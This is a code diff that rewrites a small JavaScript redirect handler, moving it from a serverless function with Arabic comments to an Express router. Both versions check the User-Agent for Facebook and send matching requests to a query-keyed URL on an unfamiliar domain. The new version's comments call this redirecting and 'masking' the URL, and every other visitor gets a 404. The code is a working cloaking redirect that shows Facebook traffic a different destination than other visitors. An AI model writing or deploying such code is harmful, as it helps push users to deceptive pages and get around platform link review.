@@ -1,12 +1,22 @@
-export default function handler(req, res) {
-  const userAgent = req.headers['user-agent'] || '';
+// api/redirect.js
 
-  // تحقق مما إذا كان الطلب قادم من Facebook
-  if (userAgent.includes('FacebookExternalHit')) {
-    // إعادة التوجيه إلى URL مخصص لمستخدمي Facebook
-    res.redirect(301, 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
+const express = require('express');
+const router = express.Router();
+
+// The target URL to redirect and mask
+const TARGET_URL = 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb';
+
+// Middleware to handle redirection
+router.get('*', (req, res) => {
+  // Check if the request is from Facebook
+  const userAgent = req.get('User-Agent') || '';
+  if (userAgent.includes('Facebook')) {
+    // Redirect and mask the URL for Facebook
+    res.redirect(TARGET_URL);
   } else {
-    // إعادة التوجيه إلى URL آخر أو عرض محتوى مختلف لمستخدمي الويب العاديين
-    res.redirect(301, 'm.facebook.com');
+    // For other requests, you might want to send a 404 or handle them differently
+    res.status(404).send('Not Found');
   }
-}
+});
+
+module.exports = router;
